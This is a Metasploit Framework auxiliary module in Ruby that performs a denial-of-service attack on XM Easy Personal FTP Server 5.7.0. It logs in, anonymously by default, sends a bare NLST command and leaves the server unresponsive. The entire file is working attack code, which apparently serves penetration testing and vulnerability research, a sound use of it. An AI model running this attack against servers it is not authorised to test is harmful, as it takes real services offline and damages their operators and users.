##
# $Id: xmeasy570_nlst.rb 6479 2009-04-13 14:33:26Z kris $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/ 
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ftp
	include Msf::Auxiliary::Dos
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'XM Easy Personal FTP Server 5.7.0 NLST DoS',
			'Description'    => %q{
				You need a valid login to DoS this FTP server, but
				even anonymous can do it as long as it has permission
				to call NLST.
			},
			'Author'         => 'kris katterjohn',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 6479 $',
			'References'     => [
				[ 'URL', 'http://milw0rm.com/exploits/8294' ]
			],
			'DisclosureDate' => 'Mar 27 2009')
		)

		# They're required
		register_options([
			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
		])
	end

	def run
		return unless connect_login

		raw_send("NLST\r\n")

		disconnect

		print_status("OK, server may still be technically listening, but it won't respond")
	end
end
